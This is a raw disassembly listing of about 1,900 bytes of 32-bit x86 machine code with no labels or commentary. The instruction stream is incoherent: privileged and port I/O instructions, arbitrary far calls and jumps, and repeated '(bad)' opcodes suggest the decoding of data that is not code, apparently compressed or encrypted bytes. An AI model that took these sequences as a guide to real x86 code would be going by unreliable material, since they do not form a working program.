  40e62e:	int3   
  40e62f:	and    ch,BYTE PTR [edx+0x59]
  40e632:	cs cwde 
  40e634:	fsubp  st(3),st
  40e636:	mov    ds:0x7007df53,eax
  40e63b:	sbb    esp,ebx
  40e63d:	mov    ah,0xcd
  40e63f:	or     ebx,DWORD PTR [ebx+0x572bb175]
  40e645:	sbb    al,0x88
  40e647:	mov    ebp,0x8cbff78d
  40e64c:	push   esi
  40e64d:	ss mov dl,0x66
  40e650:	stos   DWORD PTR es:[edi],eax
  40e651:	pusha  
  40e652:	icebp  
  40e653:	xor    al,0x2c
  40e655:	jg     0x40e668
  40e657:	pop    ebx
  40e658:	or     esp,DWORD PTR [edx+0x35c82887]
  40e65e:	in     al,dx
  40e65f:	inc    edx
  40e660:	or     al,0x56
  40e662:	adc    DWORD PTR [ebx+0x12],esi
  40e665:	sbb    eax,0xf87b485e
  40e66a:	and    al,0x2f
  40e66c:	push   0x61
  40e66e:	mov    WORD PTR [ecx+0x4d],fs
  40e671:	hlt    
  40e672:	in     eax,0xb7
  40e674:	ret    
  40e675:	mov    WORD PTR [esi],?
  40e677:	adc    eax,0x3ee94df8
  40e67c:	add    BYTE PTR [esi+0x23fed2d7],dh
  40e682:	cli    
  40e683:	fnstcw WORD PTR [edx-0x9]
  40e686:	cmp    eax,0xe35d35a4
  40e68b:	ficom  DWORD PTR [ebx+0x49]
  40e68e:	aaa    
  40e68f:	repz xor BYTE PTR [edx+0x75d8081c],bh
  40e696:	push   ds
  40e697:	hlt    
  40e698:	scas   eax,DWORD PTR es:[edi]
  40e699:	push   ss
  40e69a:	call   0x9c22:0x990fcbfd
  40e6a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6a2:	or     al,0xb8
  40e6a4:	popa   
  40e6a5:	or     cl,BYTE PTR [ebx+0x234e0982]
  40e6ab:	mov    al,ds:0x6ff744f6
  40e6b0:	neg    DWORD PTR [eax-0x17c09c9f]
  40e6b6:	call   0x630c04ae
  40e6bb:	xchg   ebp,eax
  40e6bc:	aad    0x15
  40e6be:	sub    BYTE PTR [edx],0x60
  40e6c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6c2:	push   ds
  40e6c3:	rcl    DWORD PTR [eax+0x2e],cl
  40e6c6:	cmp    BYTE PTR [ecx+ebp*4],bl
  40e6c9:	inc    eax
  40e6ca:	mov    ebx,0xb031dead
  40e6cf:	imul   esi,DWORD PTR [edi],0x430b3e30
  40e6d5:	scas   eax,DWORD PTR es:[edi]
  40e6d6:	pop    edx
  40e6d7:	xchg   DWORD PTR [edx+esi*1+0x27136a53],esp
  40e6de:	js     0x40e6de
  40e6e0:	inc    esp
  40e6e1:	push   0x2c41ac71
  40e6e6:	dec    edi
  40e6e7:	in     eax,dx
  40e6e8:	cdq    
  40e6e9:	test   BYTE PTR [ecx+0x45376005],bl
  40e6ef:	neg    BYTE PTR [edx]
  40e6f1:	ret    0x39aa
  40e6f4:	gs jecxz 0x40e6c6
  40e6f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6f8:	inc    edi
  40e6f9:	xchg   ebx,eax
  40e6fa:	lds    esi,FWORD PTR [eax]
  40e6fc:	aaa    
  40e6fd:	retf   0x8636
  40e700:	mov    ah,0x8
  40e702:	sar    DWORD PTR ds:0x7c9d3cc2,cl
  40e708:	cmp    dh,dh
  40e70a:	mov    BYTE PTR [ebx+0x728e21d1],dl
  40e710:	in     al,dx
  40e711:	sbb    al,0xc4
  40e713:	test   dl,bl
  40e715:	adc    ebp,DWORD PTR [edx-0x15551d69]
  40e71b:	mov    esi,0x44a107af
  40e720:	bts    DWORD PTR [ecx],ebp
  40e723:	cmp    ebp,ecx
  40e725:	mov    bl,al
  40e727:	add    BYTE PTR [ebx],ch
  40e729:	jnp    0x40e711
  40e72b:	test   eax,0x41bee82c
  40e730:	aaa    
  40e731:	add    ch,dh
  40e733:	loope  0x40e722
  40e735:	clc    
  40e736:	and    cl,bh
  40e738:	scas   eax,DWORD PTR es:[edi]
  40e739:	cmp    esp,DWORD PTR [ecx-0x11]
  40e73c:	cli    
  40e73d:	mov    BYTE PTR [ecx],bl
  40e73f:	push   esi
  40e740:	sub    cl,BYTE PTR [eax]
  40e742:	and    eax,0x63b25360
  40e747:	and    ebp,esp
  40e749:	test   DWORD PTR [ebp+0x21bcd4b9],ecx
  40e74f:	adc    ah,BYTE PTR [ebp+0x42]
  40e752:	dec    ebx
  40e753:	pop    ecx
  40e754:	jl     0x40e7d5
  40e756:	xchg   ebp,eax
  40e757:	or     edi,ebp
  40e759:	mov    ch,0x3b
  40e75b:	in     al,0x1f
  40e75d:	jmp    0xaeca:0x2da72c1e
  40e764:	cmp    al,bh
  40e766:	jp     0x40e7b1
  40e768:	inc    ecx
  40e769:	xor    al,0xc7
  40e76b:	sahf   
  40e76c:	ret    0xe0a0
  40e76f:	inc    edi
  40e770:	push   ebx
  40e771:	std    
  40e772:	sbb    edi,DWORD PTR [esi]
  40e774:	or     esp,DWORD PTR [edi]
  40e776:	sahf   
  40e777:	xor    eax,ecx
  40e779:	aam    0xe3
  40e77b:	xchg   edi,eax
  40e77c:	cmp    BYTE PTR [eax],0x6d
  40e77f:	add    BYTE PTR [edx],al
  40e781:	adc    ah,ah
  40e783:	bound  esi,QWORD PTR [edx+ebp*4]
  40e786:	or     edi,ebp
  40e788:	or     DWORD PTR [esi-0x23],ebx
  40e78b:	call   0x5b0b5b
  40e790:	jmp    0x40e7e3
  40e792:	lea    edi,[eax+0x67279023]
  40e798:	pop    es
  40e799:	push   0x38b237eb
  40e79e:	mov    dl,0x21
  40e7a0:	rcl    BYTE PTR [edx-0x54],cl
  40e7a3:	ss inc edi
  40e7a5:	fsub   DWORD PTR [edx-0x77]
  40e7a8:	jne    0x40e7fa
  40e7aa:	mov    edi,esp
  40e7ac:	lahf   
  40e7ad:	mov    ch,0x55
  40e7af:	pushf  
  40e7b0:	sub    al,BYTE PTR [esi+0x4cc55b27]
  40e7b6:	jnp    0x40e836
  40e7b8:	int3   
  40e7b9:	dec    edx
  40e7ba:	fiadd  DWORD PTR [ebp+0x7305ba7a]
  40e7c0:	cmc    
  40e7c1:	div    DWORD PTR [ebx-0x1e3e198b]
  40e7c7:	inc    ecx
  40e7c8:	fadd   DWORD PTR [esi-0x535007aa]
  40e7ce:	js     0x40e7e5
  40e7d0:	push   esp
  40e7d1:	bswap  esp
  40e7d3:	lods   al,BYTE PTR cs:[esi]
  40e7d5:	ffree  st(6)
  40e7d7:	and    DWORD PTR [edx-0x15],ecx
  40e7da:	jecxz  0x40e84d
  40e7dc:	loope  0x40e7ca
  40e7de:	icebp  
  40e7df:	inc    edx
  40e7e0:	and    edx,DWORD PTR [esi-0x6923e759]
  40e7e6:	mov    eax,0x1f9045ea
  40e7eb:	mov    al,0x26
  40e7ed:	adc    DWORD PTR [ebx],ebx
  40e7ef:	(bad)  
  40e7f0:	cld    
  40e7f1:	adc    al,0x3b
  40e7f3:	mov    ds:0x1ec1ee49,eax
  40e7f8:	enter  0x7111,0x51
  40e7fc:	fstp   st(5)
  40e7fe:	push   ds
  40e7ff:	retf   
  40e800:	jmp    0x40e858
  40e802:	jecxz  0x40e7b1
  40e804:	pop    eax
  40e805:	and    ebx,edx
  40e807:	inc    edx
  40e808:	retf   0xc6bf
  40e80b:	xor    al,BYTE PTR [esi-0x60778841]
  40e811:	call   0x855429af
  40e816:	nop
  40e817:	lods   al,BYTE PTR ds:[esi]
  40e818:	data16 mov WORD PTR [ebp-0x3f],es
  40e81c:	lods   eax,DWORD PTR ds:[esi]
  40e81e:	shl    BYTE PTR [ecx],cl
  40e820:	imul   ecx,DWORD PTR [ecx+0x47231185],0xffffffcd
  40e827:	and    DWORD PTR [ebx+0x2ca7f67],esi
  40e82d:	xchg   ebx,eax
  40e82e:	(bad)  
  40e82f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e830:	xchg   ecx,eax
  40e831:	pop    ebx
  40e832:	daa    
  40e833:	mov    ecx,0xa69173e7
  40e838:	adc    BYTE PTR [esi],al
  40e83a:	add    BYTE PTR [ebp+0x2a950f51],ah
  40e840:	add    al,0x7b
  40e842:	leave  
  40e843:	(bad)  
  40e844:	popa   
  40e845:	jbe    0x40e810
  40e847:	mov    al,ds:0x9018c81e
  40e84c:	sbb    esp,DWORD PTR [edx+0x3ede6eaa]
  40e852:	mov    edi,DWORD PTR [ebx+ecx*1]
  40e855:	pop    ds
  40e856:	lods   al,BYTE PTR ds:[esi]
  40e857:	imul   ebx,DWORD PTR [ecx+edi*8],0x66
  40e85b:	js     0x40e8aa
  40e85d:	push   ecx
  40e85e:	fs popf 
  40e860:	push   cs
  40e861:	xor    al,0x90
  40e863:	sbb    al,0xe3
  40e865:	mov    ebx,0xcb59d0d8
  40e86a:	pushf  
  40e86b:	inc    ebp
  40e86c:	xchg   esi,eax
  40e86d:	inc    esp
  40e86e:	(bad)  
  40e86f:	leave  
  40e870:	test   eax,0x9e90d38a
  40e875:	mov    ah,0xff
  40e877:	jnp    0x40e86b
  40e879:	jbe    0x40e8c1
  40e87b:	and    ecx,edx
  40e87d:	ins    BYTE PTR es:[edi],dx
  40e87e:	pop    eax
  40e87f:	pop    ss
  40e880:	jne    0x40e83a
  40e882:	pop    ebp
  40e883:	mov    esp,DWORD PTR [edi-0x15]
  40e886:	mov    esp,0x196229da
  40e88b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e88c:	mov    BYTE PTR [ecx-0x46c66f65],dl
  40e892:	sub    DWORD PTR [esi-0x35],esp
  40e895:	(bad)  
  40e896:	pop    esi
  40e897:	test   DWORD PTR ds:0xec5700f1,esp
  40e89d:	and    bh,BYTE PTR [ecx-0x21bf7092]
  40e8a3:	gs cs or eax,0x6117c77d
  40e8aa:	xor    al,0xbb
  40e8ac:	add    DWORD PTR [edx-0x59a9ea38],esi
  40e8b2:	das    
  40e8b3:	ins    BYTE PTR es:[edi],dx
  40e8b4:	fucom  st(3)
  40e8b6:	das    
  40e8b7:	or     eax,0xa15e32ab
  40e8bc:	aaa    
  40e8bd:	and    eax,0x94143f32
  40e8c2:	ins    BYTE PTR es:[edi],dx
  40e8c3:	inc    ebx
  40e8c4:	pop    esi
  40e8c5:	dec    ebp
  40e8c6:	add    BYTE PTR [ecx-0x698eb239],bh
  40e8cc:	aaa    
  40e8cd:	imul   esi,DWORD PTR [esi+eax*1-0x2ca5d5fa],0x74
  40e8d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8d6:	push   ss
  40e8d7:	mov    edi,0x31a182d0
  40e8dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8dd:	js     0x40e956
  40e8df:	fs or  dh,ch
  40e8e2:	jmp    0x40e95d
  40e8e4:	fistp  DWORD PTR [edi+eiz*1]
  40e8e7:	adc    BYTE PTR [eax],0x39
  40e8ea:	shl    BYTE PTR [eax],cl
  40e8ec:	jg     0x40e90c
  40e8ee:	daa    
  40e8ef:	adc    eax,0xcbf69a37
  40e8f4:	cmp    DWORD PTR [edx-0x32947e63],esp
  40e8fa:	call   0xa90d45a8
  40e8ff:	xor    eax,DWORD PTR [esi-0x47]
  40e902:	js     0x40e8d7
  40e904:	mov    edx,0x18484894
  40e909:	lahf   
  40e90a:	daa    
  40e90b:	ins    BYTE PTR es:[edi],dx
  40e90c:	mov    ah,0x0
  40e90e:	inc    ebx
  40e90f:	xor    DWORD PTR [ebx+0x13c257e0],0x6d2ec53c
  40e919:	cmp    BYTE PTR [esi],dl
  40e91b:	(bad)
  40e91f:	pop    es
  40e920:	inc    edi
  40e921:	mov    cl,0x2f
  40e923:	aas    
  40e924:	call   0x6afa3a6b
  40e929:	shl    DWORD PTR [ebx],cl
  40e92b:	neg    DWORD PTR [eax-0x3e54fe65]
  40e931:	jnp    0x40e8d4
  40e933:	or     eax,0x4a4106a2
  40e938:	push   ds
  40e939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e93a:	aas    
  40e93b:	pop    ecx
  40e93c:	loopne 0x40e94e
  40e93e:	push   ebx
  40e93f:	sub    eax,0x1402a3a0
  40e944:	sti    
  40e945:	xchg   esi,eax
  40e946:	data16 fmul DWORD PTR ds:0x9478b102
  40e94d:	sub    ch,BYTE PTR [edi]
  40e94f:	ins    DWORD PTR es:[edi],dx
  40e950:	xchg   ecx,eax
  40e951:	popa   
  40e952:	test   BYTE PTR [esi],bl
  40e954:	inc    esi
  40e955:	and    eax,DWORD PTR [ebx+0x1407986f]
  40e95b:	jmp    0xc040ca76
  40e960:	pusha  
  40e961:	dec    ebp
  40e962:	test   bh,bl
  40e964:	mov    es,WORD PTR [ecx+0x8]
  40e967:	retf   
  40e968:	(bad)  
  40e969:	mov    ebx,0xfcfb8bc2
  40e96e:	xor    ch,BYTE PTR [esi+eax*2-0x2a]
  40e972:	sub    BYTE PTR [edi],ah
  40e974:	aad    0xa7
  40e976:	mov    eax,ecx
  40e978:	dec    ecx
  40e979:	mov    eax,DWORD PTR [eax+0x5d2ac2a5]
  40e97f:	into   
  40e980:	xlat   BYTE PTR fs:[ebx]
  40e982:	lods   al,BYTE PTR ds:[esi]
  40e983:	xor    al,0x9a
  40e985:	pop    esp
  40e986:	sub    DWORD PTR [ecx+0xe7061ab],0x6
  40e98d:	addr16 sahf 
  40e98f:	lea    ebp,[ecx-0x1b]
  40e992:	stos   DWORD PTR es:[edi],eax
  40e993:	xchg   BYTE PTR [ebx+0x6c773e99],al
  40e999:	sub    ebp,ebp
  40e99b:	jmp    DWORD PTR [edi-0xa]
  40e99e:	ja     0x40e9dc
  40e9a0:	js     0x40e9b2
  40e9a2:	ins    DWORD PTR es:[edi],dx
  40e9a3:	and    ecx,DWORD PTR [esi-0x53e23383]
  40e9a9:	ficom  WORD PTR [esp+ebp*2-0x37]
  40e9ad:	adc    eax,0xa194f238
  40e9b2:	lds    edx,FWORD PTR [ebp+0x45a4577c]
  40e9b8:	in     al,dx
  40e9b9:	jo     0x40ea2b
  40e9bb:	sub    ah,BYTE PTR [ebp+ebx*1-0x5e948323]
  40e9c2:	stos   DWORD PTR es:[edi],eax
  40e9c3:	into   
  40e9c4:	mov    eax,ds:0x73e57074
  40e9c9:	xor    DWORD PTR [edi],edi
  40e9cb:	repnz cli 
  40e9cd:	data16 fmul st,st(6)
  40e9d1:	shl    ebp,0x82
  40e9d4:	mov    ds:0xdd201d93,eax
  40e9d9:	fisubr WORD PTR ds:0xc12bc41b
  40e9df:	sub    BYTE PTR [edx],dl
  40e9e1:	jl     0x40e988
  40e9e3:	mov    ds,edi
  40e9e5:	xor    edi,DWORD PTR [edx]
  40e9e7:	or     cl,ch
  40e9e9:	adc    BYTE PTR [edi-0xa0c7be3],bl
  40e9ef:	pop    edi
  40e9f0:	xor    al,0x73
  40e9f2:	push   esp
  40e9f3:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9f5:	add    BYTE PTR ds:0x477d5bb8,ah
  40e9fb:	cdq    
  40e9fc:	cmp    ah,ah
  40e9fe:	add    ebp,DWORD PTR [edi+0xc]
  40ea01:	jnp    0x40e9db
  40ea03:	call   0x69e0ab9f
  40ea08:	aas    
  40ea09:	lods   al,BYTE PTR ds:[esi]
  40ea0a:	and    BYTE PTR [esi+eiz*1+0x466a5f0e],bl
  40ea11:	inc    eax
  40ea12:	push   0x9d22f24d
  40ea17:	fisub  DWORD PTR [ebp-0x2821d976]
  40ea1d:	stos   DWORD PTR es:[edi],eax
  40ea1e:	out    0xce,al
  40ea20:	call   0xf115ecf5
  40ea25:	push   ebp
  40ea26:	fldcw  WORD PTR [ebp-0xda04cbf]
  40ea2c:	imul   ecx,ecx,0xcb5ea067
  40ea32:	shl    BYTE PTR [eax],0xb6
  40ea35:	fcom   DWORD PTR [eax]
  40ea37:	xor    ecx,DWORD PTR [ebx+0x68]
  40ea3a:	pop    eax
  40ea3b:	stos   DWORD PTR es:[edi],eax
  40ea3c:	push   esp
  40ea3d:	or     al,0x54
  40ea3f:	and    eax,0xa3118275
  40ea44:	loope  0x40e9ec
  40ea46:	fdiv   st(7),st
  40ea48:	push   0x6a
  40ea4a:	sahf   
  40ea4b:	outs   dx,DWORD PTR ds:[esi]
  40ea4c:	dec    edx
  40ea4d:	add    DWORD PTR [ecx+0x7],esp
  40ea50:	dec    ecx
  40ea51:	popf   
  40ea52:	mov    ?,WORD PTR [eax-0x313eab3a]
  40ea58:	add    al,0x52
  40ea5a:	jne    0x40eab4
  40ea5c:	test   ebx,0x45f53c2f
  40ea62:	stos   BYTE PTR es:[edi],al
  40ea63:	ds sub eax,0x8da25d73
  40ea69:	scas   al,BYTE PTR es:[edi]
  40ea6a:	jns    0x40eaea
  40ea6c:	mov    cl,0x64
  40ea6e:	shl    BYTE PTR [eax],1
  40ea70:	push   es
  40ea71:	pusha  
  40ea72:	int    0xb8
  40ea74:	dec    ebx
  40ea75:	out    0x97,al
  40ea77:	mov    eax,ds:0x924f2230
  40ea7c:	outs   dx,BYTE PTR ds:[esi]
  40ea7d:	sbb    BYTE PTR [ebx],cl
  40ea7f:	cmp    edx,DWORD PTR [edi-0x24]
  40ea82:	xchg   esi,eax
  40ea83:	fisubr DWORD PTR [eax+esi*8-0x11b300f9]
  40ea8a:	xlat   BYTE PTR ds:[ebx]
  40ea8b:	outs   dx,DWORD PTR ds:[esi]
  40ea8c:	call   0xd542:0xa96fb9a1
  40ea93:	jnp    0x40eaa5
  40ea95:	dec    ebp
  40ea96:	cmp    bl,BYTE PTR [ecx-0x1ccf85e4]
  40ea9c:	xor    al,0xa5
  40ea9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea9f:	mov    ch,0xd4
  40eaa1:	sar    BYTE PTR [ebx-0xf],1
  40eaa4:	nop
  40eaa5:	test   al,0xfa
  40eaa7:	pop    ss
  40eaa8:	jo     0x40eb09
  40eaaa:	out    0xe7,eax
  40eaac:	xchg   esi,eax
  40eaad:	sbb    eax,0x612e544e
  40eab2:	push   ecx
  40eab3:	fdiv   DWORD PTR [ecx-0x315abc16]
  40eab9:	xor    DWORD PTR [ebx+ebx*8+0x2285fcc6],0x3d
  40eac1:	xor    al,0x76
  40eac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eac4:	xor    BYTE PTR [eax+0x6524cb02],bl
  40eaca:	mov    bh,0xf4
  40eacc:	sub    edx,DWORD PTR [ecx-0x7836cf34]
  40ead2:	jg     0x40eb3f
  40ead4:	dec    esi
  40ead5:	inc    edx
  40ead6:	outs   dx,DWORD PTR ds:[esi]
  40ead7:	clc    
  40ead8:	enter  0x616e,0x11
  40eadc:	fld    DWORD PTR [esi+0x288e65bb]
  40eae2:	inc    esp
  40eae3:	fmulp  st(2),st
  40eae5:	pop    es
  40eae6:	das    
  40eae7:	data16 test BYTE PTR [edi-0x46],ch
  40eaeb:	mov    esp,DWORD PTR [esi+0x4dbd0cd2]
  40eaf1:	adc    ebp,DWORD PTR ds:0x2d0cb4be
  40eaf7:	pop    ds
  40eaf8:	gs mov al,0xbe
  40eafb:	xchg   esi,eax
  40eafc:	mov    cl,dh
  40eafe:	mov    dl,0x80
  40eb00:	or     BYTE PTR [ebx+0x6060785c],ah
  40eb06:	jge    0x40ead5
  40eb08:	jb     0x40eaad
  40eb0a:	push   0xffffffa9
  40eb0c:	in     eax,0x56
  40eb0e:	add    al,0xa9
  40eb10:	int    0xa4
  40eb12:	mov    ebx,0x12724ac0
  40eb17:	sti    
  40eb18:	ja     0x40eb65
  40eb1a:	adc    al,0x5
  40eb1c:	jle    0x40eadd
  40eb1e:	cs xor eax,0x558b5e27
  40eb24:	sub    DWORD PTR es:0xa1bb34b6,esp
  40eb2b:	jo     0x40eb70
  40eb2d:	mov    ebx,0x6ff864c
  40eb32:	xchg   BYTE PTR [ecx-0x1a559f14],dh
  40eb38:	push   esi
  40eb39:	push   es
  40eb3a:	pop    ecx
  40eb3b:	mov    ebx,0x3805d0b0
  40eb40:	dec    ebx
  40eb41:	daa    
  40eb42:	push   edx
  40eb43:	sbb    DWORD PTR [ecx+0x79],eax
  40eb46:	dec    eax
  40eb47:	inc    esi
  40eb48:	jmp    0x40eb2f
  40eb4a:	pop    esp
  40eb4b:	mov    ah,0x9c
  40eb4d:	addr16 leave 
  40eb4f:	test   eax,0xa36d83d6
  40eb54:	out    0xa0,eax
  40eb56:	jmp    0x156c:0xe430aa7d
  40eb5d:	and    esi,ebp
  40eb5f:	mov    WORD PTR [eax-0x769fda70],es
  40eb65:	mov    eax,ds:0xe8862fb0
  40eb6a:	rep lods al,BYTE PTR ds:[esi]
  40eb6c:	in     al,dx
  40eb6d:	xor    ecx,0x14
  40eb70:	jle    0x40ebcf
  40eb72:	adc    DWORD PTR [edi],esi
  40eb74:	or     al,0xc
  40eb76:	cmp    BYTE PTR [esi+0xed4901a],ch
  40eb7c:	pusha  
  40eb7d:	and    eax,0x3c37c01e
  40eb82:	gs into 
  40eb84:	sub    edx,esi
  40eb86:	pop    esi
  40eb87:	inc    ecx
  40eb88:	adc    dl,bh
  40eb8a:	dec    esp
  40eb8b:	test   al,0x0
  40eb8d:	or     bh,BYTE PTR [edx-0x33b9a10d]
  40eb93:	jg     0x40ebc6
  40eb95:	rol    DWORD PTR [ecx],1
  40eb97:	xlat   BYTE PTR ds:[ebx]
  40eb98:	popa   
  40eb99:	stos   BYTE PTR es:[edi],al
  40eb9a:	aam    0x94
  40eb9c:	pop    edx
  40eb9d:	and    ah,0x24
  40eba0:	xchg   DWORD PTR [ebp-0x590225b6],edi
  40eba6:	sbb    BYTE PTR ss:[ebx],0x5
  40ebaa:	jb     0x40ebd8
  40ebac:	mov    esi,ecx
  40ebae:	inc    edx
  40ebaf:	sti    
  40ebb0:	call   0x981f:0xc9d702c9
  40ebb7:	ins    BYTE PTR es:[edi],dx
  40ebb8:	sbb    eax,0x241c680a
  40ebbd:	adc    edx,DWORD PTR [edi+0x11]
  40ebc0:	sub    ch,bl
  40ebc2:	hlt    
  40ebc3:	xor    DWORD PTR [edi],edx
  40ebc5:	adc    bh,BYTE PTR [ebx-0x1d5bf9af]
  40ebcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebcc:	(bad)  
  40ebcd:	push   ss
  40ebce:	pop    eax
  40ebcf:	adc    cl,BYTE PTR [edx]
  40ebd1:	push   es
  40ebd2:	jo     0x40ec35
  40ebd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebd5:	dec    ecx
  40ebd6:	mov    ds:0x72e51aab,al
  40ebdb:	fadd   DWORD PTR [eax+0x3cdad63b]
  40ebe1:	in     eax,dx
  40ebe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebe3:	push   0xffffff8c
  40ebe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebe6:	mov    DWORD PTR [esi+eax*8+0x6c4f4f09],ebp
  40ebed:	push   esi
  40ebee:	mov    ah,0x94
  40ebf0:	fldcw  WORD PTR [edx-0x78e1ad5b]
  40ebf6:	adc    BYTE PTR [esi+0x29],ah
  40ebf9:	stc    
  40ebfa:	lock and al,0x41
  40ebfd:	mov    edi,0xa0527c62
  40ec02:	xor    dh,bl
  40ec04:	cli    
  40ec05:	push   ecx
  40ec06:	add    BYTE PTR [ecx+0x19],dl
  40ec09:	scas   eax,DWORD PTR es:[edi]
  40ec0a:	(bad)  
  40ec0b:	cwde   
  40ec0c:	jmp    0x40ec24
  40ec0e:	jl     0x40ebab
  40ec10:	fwait
  40ec11:	or     cl,BYTE PTR [ebx-0x78]
  40ec14:	lock and eax,0x1d395431
  40ec1a:	fnstenv [esi-0x3c]
  40ec1d:	adc    al,0x8d
  40ec1f:	mov    cl,0xd
  40ec21:	add    edi,DWORD PTR [edi+esi*8+0x4f2e8998]
  40ec28:	pop    eax
  40ec29:	fnsave cs:[edx-0x54db015e]
  40ec30:	repnz nop
  40ec32:	in     eax,0xeb
  40ec34:	nop
  40ec35:	icebp  
  40ec36:	inc    ebx
  40ec37:	dec    BYTE PTR [ebx-0x5979bfd4]
  40ec3d:	or     al,cl
  40ec3f:	push   0x6349258b
  40ec44:	(bad)  
  40ec45:	mov    eax,0x95d3b105
  40ec4a:	dec    edi
  40ec4b:	stc    
  40ec4c:	xor    BYTE PTR [ecx],ah
  40ec4e:	fistp  DWORD PTR [edi-0x3e46a15c]
  40ec54:	pop    es
  40ec55:	sbb    eax,0xbe379e04
  40ec5a:	cwde   
  40ec5b:	mov    eax,0x954ac040
  40ec60:	pop    edi
  40ec61:	mov    bl,0xd6
  40ec63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec64:	std    
  40ec65:	dec    DWORD PTR [ecx-0x5c]
  40ec68:	mov    ebp,DWORD PTR [edx]
  40ec6a:	xchg   BYTE PTR [ecx+edx*8+0x6],bl
  40ec6e:	inc    ecx
  40ec6f:	sub    edx,esi
  40ec71:	rcr    BYTE PTR gs:[esi+0x7c],cl
  40ec75:	bound  ecx,QWORD PTR ds:0xe1567480
  40ec7b:	popa   
  40ec7c:	mov    bl,0xee
  40ec7e:	ret    
  40ec7f:	and    cl,cl
  40ec81:	hlt    
  40ec82:	and    ch,bh
  40ec84:	dec    ecx
  40ec85:	mov    esp,0x6f8282a0
  40ec8a:	add    bl,BYTE PTR [ebx-0x5e857981]
  40ec90:	rcr    BYTE PTR [ebp+0x207ac39c],1
  40ec96:	mov    ecx,0x456f0cf2
  40ec9b:	clc    
  40ec9c:	ds push eax
  40ec9e:	xor    bh,BYTE PTR [eax-0x40ad31ea]
  40eca4:	fst    QWORD PTR [eax-0x48]
  40eca7:	pop    edx
  40eca8:	or     al,0xc5
  40ecaa:	lods   al,BYTE PTR ds:[esi]
  40ecab:	fdivrp st(7),st
  40ecad:	push   edi
  40ecae:	jae    0x40ecf8
  40ecb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecb1:	fcmovu st,st(2)
  40ecb3:	jecxz  0x40eca2
  40ecb5:	push   ss
  40ecb6:	mov    ds:0x8dfa0961,al
  40ecbb:	mov    ebx,0xccbe5ba5
  40ecc0:	or     DWORD PTR [edi-0x15b38a0],edx
  40ecc6:	in     eax,0x6c
  40ecc8:	jp     0x40ecfb
  40ecca:	fisttp DWORD PTR [eax+0x12]
  40eccd:	mov    ebp,0xb52ae616
  40ecd2:	xor    ah,BYTE PTR [edx+ebx*1-0x37]
  40ecd6:	rcl    al,0x5a
  40ecd9:	test   cl,dl
  40ecdb:	ds xchg edx,eax
  40ecdd:	enter  0xd92f,0x6c
  40ece1:	out    dx,al
  40ece2:	ins    BYTE PTR es:[edi],dx
  40ece3:	rcl    bh,1
  40ece5:	mov    cl,0x43
  40ece7:	pop    edi
  40ece8:	and    BYTE PTR [esi],0x5f
  40eceb:	xchg   ebx,eax
  40ecec:	daa    
  40eced:	pop    edx
  40ecee:	fdivr  st(4),st
  40ecf0:	lea    esi,[ebp-0x16]
  40ecf3:	jecxz  0x40ec79
  40ecf5:	dec    ebp
  40ecf6:	fild   DWORD PTR [edi+esi*2-0x5a]
  40ecfa:	outs   dx,DWORD PTR ds:[esi]
  40ecfb:	ja     0x40ecb6
  40ecfd:	cwde   
  40ecfe:	pop    edi
  40ecff:	xchg   DWORD PTR [edx-0x14],edx
  40ed02:	xchg   esp,eax
  40ed03:	(bad)
  40ed07:	inc    esp
  40ed08:	lods   eax,DWORD PTR ds:[esi]
  40ed09:	int3   
  40ed0a:	and    BYTE PTR [edi+0x37],bl
  40ed0d:	push   ds
  40ed0e:	sahf   
  40ed0f:	les    edi,FWORD PTR [edx+0x1a9ea4d3]
  40ed15:	xor    BYTE PTR [eax+0x7db62743],dh
  40ed1b:	mov    esi,0x9fb0f114
  40ed20:	dec    eax
  40ed21:	ins    BYTE PTR es:[edi],dx
  40ed22:	pushf  
  40ed23:	(bad)  
  40ed24:	push   ss
  40ed25:	push   cs
  40ed26:	adc    cl,dl
  40ed28:	in     eax,0x43
  40ed2a:	cmc    
  40ed2b:	adc    al,0xfb
  40ed2d:	xchg   edi,eax
  40ed2e:	scas   eax,DWORD PTR es:[edi]
  40ed2f:	shr    DWORD PTR [esi-0x7c],1
  40ed32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed33:	cmp    cl,BYTE PTR [ecx*2-0x21136fb8]
  40ed3a:	mov    eax,ds:0xae6d9307
  40ed3f:	dec    ebx
  40ed40:	jge    0x40ed09
  40ed42:	xacquire xchg DWORD PTR [edi-0x37e5991e],edx
  40ed49:	mov    al,ds:0x29ab0acb
  40ed4e:	pusha  
  40ed4f:	mov    esi,0xf27a63c
  40ed54:	add    al,0x99
  40ed56:	ja     0x40ed9e
  40ed58:	int    0xb4
  40ed5a:	sub    DWORD PTR [edi],esi
  40ed5c:	inc    edx
  40ed5d:	sub    eax,DWORD PTR [ecx+eiz*2+0x66168c91]
  40ed64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed65:	ins    BYTE PTR es:[edi],dx
  40ed66:	js     0x40ecf7
  40ed68:	xlat   BYTE PTR ds:[ebx]
  40ed69:	jp     0x40ed6a
  40ed6b:	jns    0x40ed5d
  40ed6d:	retf   
  40ed6e:	(bad)  
  40ed6f:	js     0x40ed0d
  40ed71:	push   ecx
  40ed72:	ss sbb eax,0x84f8cc2e
  40ed78:	push   edx
  40ed79:	ins    BYTE PTR es:[edi],dx
  40ed7a:	dec    ecx
  40ed7b:	mov    cs,WORD PTR [eax-0x1b8aa95]
  40ed81:	xchg   ecx,eax
  40ed82:	ret    
  40ed83:	cmp    dh,cl
  40ed85:	sahf   
